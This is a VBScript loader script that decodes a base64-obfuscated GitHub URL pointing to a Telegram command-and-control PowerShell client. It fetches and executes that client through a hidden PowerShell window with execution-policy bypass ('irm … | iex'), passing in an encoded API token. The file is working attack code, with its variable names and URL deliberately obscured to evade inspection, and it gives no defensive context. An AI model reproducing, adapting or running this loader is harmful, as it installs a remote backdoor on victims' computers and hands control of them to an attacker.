' ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
' ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

' This is just to crudely obfuscate the token (url is encoded also)

Set WshShell = WScript.CreateObject("WScript.Shell")

' ENCODED API TOKEN
hgjchgjc = "YOUR_BASE64_ENCODED_TOKEN"

' ENCODED URL TO THE SCRIPT
nfacvrea = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JlaWdld29ybS9Qb3dlcnNoZWxsLVRvb2xzLWFuZC1Ub3lzL21haW4vQ29tbWFuZC1hbmQtQ29udHJvbC9UZWxlZ3JhbS1DMi1DbGllbnQucHMx"

Set objXML = CreateObject("MSXML2.DOMDocument")
Set objNode = objXML.CreateElement("b64")
objNode.DataType = "bin.base64"
objNode.Text = hgjchgjc
uirsvrsy = Stream_BytesToString(objNode.NodeTypedValue)

Set objNode = objXML.CreateElement("b64")
objNode.DataType = "bin.base64"
objNode.Text = nfacvrea
enfbudv = Stream_BytesToString(objNode.NodeTypedValue)

uirsvrsy = Replace(uirsvrsy, vbLf, "")
uirsvrsy = Replace(uirsvrsy, vbCr, "")
uirsvrsy = Replace(uirsvrsy, """", "\""")
uirsvrsy = Replace(uirsvrsy, "'", "''")

enfbudv = Replace(enfbudv, vbLf, "")
enfbudv = Replace(enfbudv, vbCr, "")

psCommand = "$tg='" & uirsvrsy & "'; irm " & enfbudv & " | iex"

WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C """ & psCommand & """", 0, True

Function Stream_BytesToString(arrBytes)
    Dim objStream
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 ' adTypeBinary
    objStream.Open
    objStream.Write arrBytes
    objStream.Position = 0
    objStream.Type = 2 ' adTypeText
    objStream.Charset = "utf-8"
    Stream_BytesToString = objStream.ReadText
    objStream.Close
    Set objStream = Nothing
End Function

' ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
' ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
